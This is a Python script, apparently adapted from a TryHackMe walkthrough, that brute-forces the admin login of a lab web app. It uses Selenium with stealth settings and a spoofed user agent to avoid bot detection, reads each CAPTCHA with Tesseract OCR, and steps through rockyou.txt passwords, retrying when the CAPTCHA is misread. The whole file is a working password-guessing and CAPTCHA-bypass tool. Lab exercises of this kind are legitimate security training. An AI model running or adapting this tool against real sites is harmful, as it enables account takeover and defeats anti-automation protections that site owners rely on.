'''
this script is just a modified version of the script provided in 'Automating CAPTCHA Bypass' section of 'Tooling via Browser Automation' walkthrough in TryHackMe.
Things I have changed:
  1. use img[alt='CAPTCHA'] instead of find_element(By.TAG_NAME, "img") which blindly grabs the first image.
  2. instead of .submit() I used .click() on login button to trigger the script.js which encrypts and process our inputs.
  3. add a fallback retrying same password again incase CAPTCHA is misread.

Before running this script make sure to run these commands:
$ cd /usr/share/wordlists && head -n 100 rockyou.txt > passwords.txt
$ pip3 install selenium selenium-stealth pillow pytesseract
$ apt-get install -y chromium-driver
'''
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import time

TARGET_URL = "http://<TARGET_MACHINE_IP>/index.php"
DASHBOARD_URL = "http://<TARGET_MACHINE_IP>/dashboard.php"
USERNAME = "admin"
WORDLIST = "passwords.txt"

options = Options()
options.add_argument("--no-sandbox")
options.add_argument("--headless")
options.add_argument("start-maximized")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-cache")
options.add_argument("--disable-gpu")
options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

chrome = webdriver.Chrome(options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

with open(WORDLIST) as f:
    passwords = [line.strip() for line in f if line.strip()]

def read_captcha():
    captcha_el = chrome.find_element(By.CSS_SELECTOR, "img[alt='CAPTCHA']")
    img = Image.open(io.BytesIO(captcha_el.screenshot_as_png))
    img = img.convert("L")
    img = img.resize((img.width * 2, img.height * 2), Image.LANCZOS)
    img = img.filter(ImageFilter.SHARPEN)
    img = ImageEnhance.Contrast(img).enhance(2.0)
    img = img.point(lambda x: 0 if x < 140 else 255, "1")

    text = pytesseract.image_to_string(
        img,
        config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"
    ).strip().replace(" ", "").replace("\n", "").upper()
    return text

i = 0
while i < len(passwords):
    password = passwords[i]

    chrome.get(TARGET_URL)
    time.sleep(1)

    captcha_text = read_captcha()
    print(f"[*] CAPTCHA: {captcha_text} | Trying password: {password}")

    # Fill form
    chrome.find_element(By.NAME, "username").clear()
    chrome.find_element(By.NAME, "password").clear()
    chrome.find_element(By.NAME, "username").send_keys(USERNAME)
    chrome.find_element(By.NAME, "password").send_keys(password)
    chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)

    # Click login button (triggers JS login() → RSA encryption)
    chrome.find_element(By.ID, "login-btn").click()
    time.sleep(2)

    if DASHBOARD_URL in chrome.current_url:
        print(f"[+] SUCCESS! Password found: {password}")
        break

    # Check error message
    errors = chrome.find_elements(By.ID, "error-box")
    if errors and errors[0].is_displayed():
        error_text = errors[0].text.lower()
        if "captcha" in error_text:
            print(f"[!] CAPTCHA misread ('{captcha_text}'), retrying same password...")
            continue  # don't increment i, retry same password
        else:
            print(f"[-] Wrong password: {password} | Server said: {error_text}")

    i += 1  # only advance on wrong password, not CAPTCHA failure

chrome.quit()
